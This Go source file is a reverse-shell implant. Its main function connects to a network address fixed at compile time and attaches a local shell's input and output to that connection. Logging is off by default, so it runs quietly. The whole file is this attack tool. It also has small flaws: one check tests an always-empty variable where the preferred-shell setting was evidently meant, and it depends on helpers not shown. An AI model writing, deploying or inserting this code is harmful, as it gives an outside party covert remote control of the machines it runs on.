package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

var (
	// set during compilation via -X ldflag
	address        string
	network        string
	preferredShell string
	verbose        = "false"
)

var (
	verboseValue bool
)

func init() {
	v, err := strconv.ParseBool(verbose)
	if err == nil {
		verboseValue = v
	}
}

func determineShellCommand() (shell string, args []string, err error) {
	if shell != "" {
		suggestedShells = append([][]string{strings.Split(preferredShell, " ")}, suggestedShells...)
	}

	if err != nil {
		return "", nil, fmt.Errorf("getting shell command suggestions: %v", err)
	}

	for _, candidate := range suggestedShells {
		if len(candidate) == 0 {
			continue
		}

		_, err := exec.LookPath(candidate[0])
		if err != nil {
			continue
		}

		return candidate[0], candidate[1:], nil
	}

	return "", nil, fmt.Errorf("could not find any existing shell binary")
}

func attachShell(rw io.ReadWriter, shellBinary string, args ...string) error {
	cmd := exec.Command(shellBinary, args...)
	cmd.SysProcAttr = sysProcAttr()
	cmd.Stdin = rw
	cmd.Stdout = rw
	cmd.Stderr = rw

	err := cmd.Start()
	if err != nil {
		return fmt.Errorf("execute shell: %v", err)
	}

	err = cmd.Wait()
	if err != nil {
		return fmt.Errorf("shell died: %v", err)
	}

	return nil
}

func logf(format string, a ...interface{}) {
	if !verboseValue {
		return
	}

	fmt.Fprintf(os.Stderr, format+"\n", a...)
}

func main() {
	con, err := net.Dial(network, address)
	if err != nil {
		logf(err.Error())
		return
	}

	defer con.Close()

	shellBinary, args, err := determineShellCommand()
	if err != nil {
		logf(err.Error())
		return
	}

	logf("Using Shell: %s", shellBinary)

	err = attachShell(con, shellBinary, args...)
	if err != nil {
		logf(err.Error())
		return
	}

	logf("Shell terminated")
}
